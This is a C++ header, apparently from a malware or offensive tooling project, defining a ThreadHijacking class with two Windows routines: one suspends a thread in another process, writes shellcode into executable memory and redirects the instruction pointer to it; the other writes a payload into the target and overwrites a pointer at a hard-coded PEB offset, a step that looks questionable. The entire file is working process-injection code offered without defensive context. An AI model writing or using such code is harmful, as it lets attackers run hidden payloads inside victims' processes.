#pragma once
#include "pch.h"

class ThreadHijacking {
public:
    static bool HijackThread(HANDLE hProcess, HANDLE hThread, const BYTE* payload, SIZE_T payloadSize) {
        // Suspend thread
        if (SuspendThread(hThread) == -1) {
            return false;
        }

        // Get thread context
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(hThread, &ctx)) {
            ResumeThread(hThread);
            return false;
        }

        // Allocate memory for shellcode
        LPVOID shellcode = VirtualAllocEx(hProcess, NULL,
            payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (!shellcode) {
            ResumeThread(hThread);
            return false;
        }

        // Write shellcode
        if (!WriteProcessMemory(hProcess, shellcode, payload, payloadSize, NULL)) {
            VirtualFreeEx(hProcess, shellcode, 0, MEM_RELEASE);
            ResumeThread(hThread);
            return false;
        }

        // Save original RIP
        DWORD64 originalRip = ctx.Rip;

        // Update RIP to point to our shellcode
        ctx.Rip = (DWORD64)shellcode;

        // Set new context
        if (!SetThreadContext(hThread, &ctx)) {
            VirtualFreeEx(hProcess, shellcode, 0, MEM_RELEASE);
            ResumeThread(hThread);
            return false;
        }

        // Resume thread
        ResumeThread(hThread);
        return true;
    }

    static bool HijackExceptionHandler(HANDLE hProcess, LPVOID payload) {
        // Get PEB
        PROCESS_BASIC_INFORMATION pbi;
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) return false;

        typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
            HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
        
        pNtQueryInformationProcess NtQueryInformationProcess = 
            (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
        
        if (!NtQueryInformationProcess) return false;

        NTSTATUS status = NtQueryInformationProcess(hProcess, 
            ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
        
        if (!NT_SUCCESS(status)) return false;

        // Allocate memory for exception handler
        LPVOID exceptionHandler = VirtualAllocEx(hProcess, NULL,
            0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (!exceptionHandler) return false;

        // Write payload to exception handler
        if (!WriteProcessMemory(hProcess, exceptionHandler, payload, 0x1000, NULL)) {
            VirtualFreeEx(hProcess, exceptionHandler, 0, MEM_RELEASE);
            return false;
        }

        // Update exception handler pointer
        LPVOID exceptionHandlerPtr = (LPVOID)((DWORD64)pbi.PebBaseAddress + 0x178);
        if (!WriteProcessMemory(hProcess, exceptionHandlerPtr, &exceptionHandler, sizeof(LPVOID), NULL)) {
            VirtualFreeEx(hProcess, exceptionHandler, 0, MEM_RELEASE);
            return false;
        }

        return true;
    }
};
